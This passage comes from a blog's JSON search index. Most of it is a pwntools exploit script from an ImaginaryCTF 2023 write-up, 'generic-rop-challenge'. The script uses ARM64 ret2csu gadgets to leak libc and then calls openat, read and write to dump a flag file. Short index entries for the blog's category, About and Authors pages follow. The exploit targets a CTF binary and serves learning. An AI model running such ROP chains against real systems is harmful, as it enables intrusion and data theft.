x20 payload += flat(func_ptr, w0) # x21, x22 payload += flat(x1, x2) # x23, x24 payload += flat(bss, next_gadget) return payload # Leak LIBC payload = ret2csu(elf.got[\u0026#34;puts\u0026#34;], 0, 0, elf.got[\u0026#34;puts\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) leak_puts = u64(io.recvline(keepends=False).ljust(8, b\u0026#34;\\x00\u0026#34;)) if not args.REMOTE: leak_puts |= 0x4000000000 log.info(f\u0026#34;{leak_puts=:#x}\u0026#34;) libc.address = leak_puts - libc.symbols[\u0026#34;puts\u0026#34;] log.info(f\u0026#34;{libc.address=:#x}\u0026#34;) # gets(bss) // stdin: /home/user/flag.txt pause() log.info(f\u0026#34;setup flag path string @ bss + 0x500\u0026#34;) log.info(f\u0026#34;{flag_path=}\u0026#34;) flag_path_addr = elf.bss(0x500) payload = ret2csu(flag_path_addr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(flag_path) # absolute path to ignore `dirfd` for `openat` # gets(bss) // stdin: libc.symbols[\u0026#34;openat\u0026#34;] openat_fptr = elf.bss(0x600) log.info(f\u0026#34;setup openat function pointer @ bss + 0x600\u0026#34;) payload = ret2csu(openat_fptr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(p64(libc.symbols[\u0026#34;openat\u0026#34;])) # fini_ptr = 0x400e20 # openat(0, flag_path_addr, 0) log.info(f\u0026#34;openat(0, flag_path_addr, 0)\u0026#34;) payload = ret2csu(0, flag_path_addr, 0, openat_fptr, elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) # gets(bss) // stdin: libc.symbols[\u0026#34;read\u0026#34;] read_fptr = elf.bss(0x600) log.info(f\u0026#34;setup read function pointer @ bss + 0x600\u0026#34;) payload = ret2csu(read_fptr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(p64(libc.symbols[\u0026#34;read\u0026#34;])) # read(5, flag_addr, 0x100) flag_addr = elf.bss(0x700) log.info(f\u0026#34;read(5, flag_addr, 0x100)\u0026#34;) # trial-and-error to find the proper fd payload = ret2csu(5, flag_addr, 0x100, read_fptr, elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) # gets(bss) // stdin: libc.symbols[\u0026#34;write\u0026#34;] write_fptr = elf.bss(0x600) log.info(f\u0026#34;setup write function pointer @ bss + 0x600\u0026#34;) payload = ret2csu(write_fptr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(p64(libc.symbols[\u0026#34;write\u0026#34;])) # write(1, flag_addr, 0x100) payload = ret2csu(1, flag_addr, 0x100, write_fptr, elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.interactive() ","date":"25 July 2023","permalink":"/posts/imaginaryctf-2023/pwn/generic-rop-challenge/","section":"My Average Blog","summary":"ARM64 ROP with \u003ccode\u003eret2csu\u003c/code\u003e","title":"generic-rop-challenge"},{"content":"","date":"25 July 2023","permalink":"/categories/imaginaryctf-2023/","section":"Categories","summary":"","title":"ImaginaryCTF 2023"},{"content":"Trying to learn pwn and reversing.\n","date":"1 January 0001","permalink":"/about/","section":"d0ublew's Blog","summary":"Trying to learn pwn and reversing.","title":"About"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"}]